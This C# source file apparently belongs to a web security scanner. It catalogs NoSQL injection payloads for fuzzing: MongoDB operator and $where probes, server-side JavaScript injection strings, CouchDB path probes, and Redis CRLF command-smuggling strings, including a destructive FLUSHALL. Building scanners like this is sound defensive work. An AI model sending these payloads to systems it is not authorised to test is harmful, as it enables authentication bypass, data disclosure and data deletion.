namespace Trowser.Security;

/// <summary>
/// NoSQL injection payload catalog — paired true/false probes (PortSwigger nosqli-scanner style),
/// error-oracle payloads, Redis protocol injection, and flat strings for the request fuzzer.
/// </summary>
public static class NosqlInjectionPayloads
{
    public enum PayloadKind
    {
        JsonPair,
        QueryBracketPair,
        JsonError,
        QueryBracketError,
        FunctionPair,
        CouchPair,
        RedisProtocolPair,
        TimePair
    }

    public sealed class PayloadPair
    {
        public PayloadKind Kind { get; init; }
        /// <summary>Restrictive / should-not-bypass side (sent first).</summary>
        public string FalsePayload { get; init; } = "";
        /// <summary>Permissive / should-bypass side.</summary>
        public string TruePayload { get; init; } = "";
    }

    public sealed class ErrorPayload
    {
        public PayloadKind Kind { get; init; }
        public string Payload { get; init; } = "";
    }

    private static PayloadPair[]? _pairs;
    private static ErrorPayload[]? _errors;
    private static string[]? _flatFuzzer;

    public static IReadOnlyList<PayloadPair> Pairs => _pairs ??= BuildPairs();
    public static IReadOnlyList<ErrorPayload> Errors => _errors ??= BuildErrors();

    /// <summary>All unique strings for the <c>nosql-injection</c> fuzzer payload set.</summary>
    public static string[] FlatFuzzerPayloads => _flatFuzzer ??= BuildFlatFuzzerPayloads();

    public static IEnumerable<PayloadPair> SelectPairs(
        string? scanDepth,
        int maxPayloads = 0,
        PayloadProfile payloadProfile = PayloadProfile.Small)
    {
        var depth = AutoScanDepthProfile.Normalize(scanDepth);
        var includeTime = depth == AutoScanDepthProfile.Thorough;
        var includeExperimental = depth != AutoScanDepthProfile.Quick;

        IEnumerable<PayloadPair> q = Pairs.Where(p =>
        {
            if (p.Kind == PayloadKind.TimePair && !includeTime) return false;
            if (p.Kind is PayloadKind.FunctionPair or PayloadKind.CouchPair or PayloadKind.RedisProtocolPair
                && !includeExperimental)
                return false;
            return true;
        });

        var cap = maxPayloads > 0
            ? maxPayloads
            : depth switch
            {
                AutoScanDepthProfile.Quick => payloadProfile == PayloadProfile.Big ? 16 : 8,
                AutoScanDepthProfile.Thorough => 0,
                _ => 0
            };

        if (cap > 0)
            q = q.Take(cap);

        return q;
    }

    public static IEnumerable<ErrorPayload> SelectErrors(
        string? scanDepth,
        int maxErrors = 0,
        PayloadProfile payloadProfile = PayloadProfile.Small)
    {
        var depth = AutoScanDepthProfile.Normalize(scanDepth);
        if (depth == AutoScanDepthProfile.Quick)
            return Errors.Take(maxErrors > 0 ? maxErrors : payloadProfile == PayloadProfile.Big ? 8 : 4);

        var q = (IEnumerable<ErrorPayload>)Errors;
        if (payloadProfile == PayloadProfile.Big)
        {
            var extras = PayloadCatalog.Resolve("nosql-injection", payloadProfile);
            foreach (var p in extras)
            {
                q = q.Concat([Err(PayloadKind.JsonError, p)]);
            }
        }

        if (maxErrors > 0)
            q = q.Take(maxErrors);
        return q;
    }

    private static PayloadPair[] BuildPairs()
    {
        var list = new List<PayloadPair>
        {
            // Mongo / generic JSON operator pairs ($ and & mongoose variants)
            Pair(PayloadKind.JsonPair, "{\"$eq\":\"1\"}", "{\"$ne\":\"1\"}"),
            Pair(PayloadKind.JsonPair, "{\"$lt\":\"\"}", "{\"$gt\":\"\"}"),
            Pair(PayloadKind.JsonPair, "{\"$exists\":false}", "{\"$exists\":true}"),
            Pair(PayloadKind.JsonPair, "{\"$regex\":\".^\"}", "{\"$regex\":\".*\"}"),
            Pair(PayloadKind.JsonPair, "{\"$where\":\"return false\"}", "{\"$where\":\"return true\"}"),
            Pair(PayloadKind.JsonPair, "{\"&eq\":\"1\"}", "{\"&ne\":\"1\"}"),
            Pair(PayloadKind.JsonPair, "{\"&lt\":\"\"}", "{\"&gt\":\"\"}"),
            Pair(PayloadKind.JsonPair, "{\"&exists\":false}", "{\"&exists\":true}"),
            Pair(PayloadKind.JsonPair, "{\"&regex\":\".^\"}", "{\"&regex\":\".*\"}"),
            Pair(PayloadKind.JsonPair, "{\"&where\":\"return false\"}", "{\"&where\":\"return true\"}"),

            // URL-encoded bracket operators
            Pair(PayloadKind.QueryBracketPair, "[$eq]=1", "[$ne]=1"),
            Pair(PayloadKind.QueryBracketPair, "[$lt]=", "[$gt]="),
            Pair(PayloadKind.QueryBracketPair, "[$exists]=false", "[$exists]=true"),
            Pair(PayloadKind.QueryBracketPair, "[$regex]=.^", "[$regex]=.*"),
            Pair(PayloadKind.QueryBracketPair, "[$where]=return false", "[$where]=return true"),
            Pair(PayloadKind.QueryBracketPair, "[&eq]=1", "[&ne]=1"),
            Pair(PayloadKind.QueryBracketPair, "[&lt]=", "[&gt]="),
            Pair(PayloadKind.QueryBracketPair, "[&exists]=false", "[&exists]=true"),
            Pair(PayloadKind.QueryBracketPair, "[&regex]=.^", "[&regex]=.*"),
            Pair(PayloadKind.QueryBracketPair, "[&where]=return false", "[&where]=return true"),

            // SSJI / function-body pairs
            Pair(PayloadKind.FunctionPair, "';return 'a'=='b' && ''=='", "';return 'a'=='a' && ''=='"),
            Pair(PayloadKind.FunctionPair, "\\';return 'a'=='b' && ''=='", "\\';return 'a'=='a' && ''=='"),
            Pair(PayloadKind.FunctionPair, "\";return(false);var xyz='a", "\";return(true);var xyz='a"),
            Pair(PayloadKind.FunctionPair, "';return(false);var xyz='a", "';return(true);var xyz='a"),
            Pair(PayloadKind.FunctionPair, "a';return false;var xyz='a", "a';return true;var xyz='a"),
            Pair(PayloadKind.FunctionPair, "0;return false", "0;return true"),
            Pair(PayloadKind.FunctionPair,
                "require('os').endianness()=='LE'",
                "require('os').endianness()=='BE'"),

            // CouchDB-style path probes
            Pair(PayloadKind.CouchPair, "_security", "_all_docs"),
            Pair(PayloadKind.CouchPair, "[]=_security", "[]=_all_docs"),

            // Mongo experimental comma/$where in query values
            Pair(PayloadKind.QueryBracketPair, "true,$where:'1==2'", "true,$where:'1==1'"),
            Pair(PayloadKind.QueryBracketPair, ",$where:'1==2'", ",$where:'1==1'"),
            Pair(PayloadKind.QueryBracketPair, "$where:'1==2'", "$where:'1==1'"),
            Pair(PayloadKind.QueryBracketPair, "||1==2", "||1==1"),
            Pair(PayloadKind.QueryBracketPair, "'||'a'=='b", "'||'a'=='a"),

            // Redis protocol injection (CRLF command smuggling into key/value params)
            Pair(PayloadKind.RedisProtocolPair, "\r\nPING\r\n", "\r\nKEYS *\r\n"),
            Pair(PayloadKind.RedisProtocolPair, "\r\nPING\r\n", "\r\nINFO\r\n"),
            Pair(PayloadKind.RedisProtocolPair, "x\r\nPING\r\n", "x\r\nKEYS *\r\n"),
            Pair(PayloadKind.RedisProtocolPair, "%0d%0aPING%0d%0a", "%0d%0aKEYS%20*%0d%0a"),
            Pair(PayloadKind.RedisProtocolPair, "\nPING\n", "\nKEYS *\n"),
            Pair(PayloadKind.RedisProtocolPair, "valid\r\nGET valid\r\n", "valid\r\nCONFIG GET dir\r\n"),
        };

        // Time pairs — only used when scan depth is thorough (slow)
        list.AddRange([
            Pair(PayloadKind.TimePair, "{\"$where\":\"sleep(1)\"}", "{\"$where\":\"sleep(5)\"}"),
            Pair(PayloadKind.TimePair, "{\"&where\":\"sleep(1)\"}", "{\"&where\":\"sleep(5)\"}"),
            Pair(PayloadKind.TimePair, "a;sleep(1)", "a;sleep(5)"),
            Pair(PayloadKind.TimePair, "'a';sleep(1)", "'a';sleep(5)"),
        ]);

        return list.ToArray();
    }

    private static ErrorPayload[] BuildErrors() =>
    [
        Err(PayloadKind.JsonError, "{\"$\":\"1\"}"),
        Err(PayloadKind.JsonError, "{\"$where\":\"1\"}"),
        Err(PayloadKind.JsonError, "{\"$regex\":\"*\"}"),
        Err(PayloadKind.JsonError, "{\"$regex\":null}"),
        Err(PayloadKind.JsonError, "{\"$exists\":null}"),
        Err(PayloadKind.JsonError, "{\"$a\":null}"),
        Err(PayloadKind.JsonError, "{\"&\":\"1\"}"),
        Err(PayloadKind.JsonError, "{\"&where\":\"1\"}"),
        Err(PayloadKind.JsonError, "{\"&regex\":\"*\"}"),
        Err(PayloadKind.JsonError, "{\"&regex\":null}"),
        Err(PayloadKind.JsonError, "{\"&exists\":null}"),
        Err(PayloadKind.JsonError, "{\"&a\":null}"),
        Err(PayloadKind.QueryBracketError, "[$]=1"),
        Err(PayloadKind.QueryBracketError, "[$where]=1"),
        Err(PayloadKind.QueryBracketError, "[$regex]=*"),
        Err(PayloadKind.QueryBracketError, "[$regex]=null"),
        Err(PayloadKind.QueryBracketError, "[$exists]=null"),
        Err(PayloadKind.QueryBracketError, "[$a]=null"),
        Err(PayloadKind.QueryBracketError, "[&]=1"),
        Err(PayloadKind.QueryBracketError, "[&where]=1"),
        Err(PayloadKind.QueryBracketError, "[&regex]=*"),
        Err(PayloadKind.QueryBracketError, "[&regex]=null"),
        Err(PayloadKind.QueryBracketError, "[&exists]=null"),
        Err(PayloadKind.QueryBracketError, "[&a]=null"),
        Err(PayloadKind.QueryBracketError, "'"),
        Err(PayloadKind.QueryBracketError, "\\'"),
        // Redis malformed command / protocol errors
        Err(PayloadKind.QueryBracketError, "\r\nINVALIDCMD\r\n"),
        Err(PayloadKind.QueryBracketError, "\r\nCLIENT LIST\r\n"),
    ];

    private static string[] BuildFlatFuzzerPayloads()
    {
        var set = new HashSet<string>(StringComparer.Ordinal);
        foreach (var p in Pairs)
        {
            set.Add(p.FalsePayload);
            set.Add(p.TruePayload);
        }

        foreach (var e in Errors)
            set.Add(e.Payload);

        foreach (var extra in LegacyFlatExtras)
            set.Add(extra);

        return set.ToArray();
    }

    /// <summary>Additional single-shot payloads kept for fuzzer diversity (not all have pairs).</summary>
    private static readonly string[] LegacyFlatExtras =
    [
        "{\"$gt\":\"\"}",
        "{\"$gt\":0}",
        "{\"$ne\":null}",
        "{\"$ne\":\"\"}",
        "{\"$ne\":1}",
        "{\"$regex\":\"^a\"}",
        "{\"$where\":\"1==1\"}",
        "{\"$where\":\"this.password.match(/.*/)\"}",
        "{\"$in\":[\"admin\",\"root\"]}",
        "{\"$nin\":[\"blocked\"]}",
        "{\"$or\":[{\"admin\":true}]}",
        "{\"$lookup\":{\"from\":\"users\"}}",
        "{\"$unwind\":\"$password\"}",
        "{\"$comment\":\"test\"}",
        "true",
        "false",
        "[$gt]=",
        "[$regex]=.*",
        "[$where]=1==1",
        "';return true;var a='",
        "\";return true;var a=\"",
        "this.constructor.constructor('return this')().sleep(5000)",
        // Redis extras
        "\r\nFLUSHALL\r\n",
        "\r\nSET injected 1\r\n",
        "\r\nAPPEND key injected\r\n",
        "\r\nEVAL \"return 1\" 0\r\n",
        "redis://127.0.0.1:6379/",
    ];

    private static PayloadPair Pair(PayloadKind kind, string falsePayload, string truePayload) =>
        new() { Kind = kind, FalsePayload = falsePayload, TruePayload = truePayload };

    private static ErrorPayload Err(PayloadKind kind, string payload) =>
        new() { Kind = kind, Payload = payload };
}
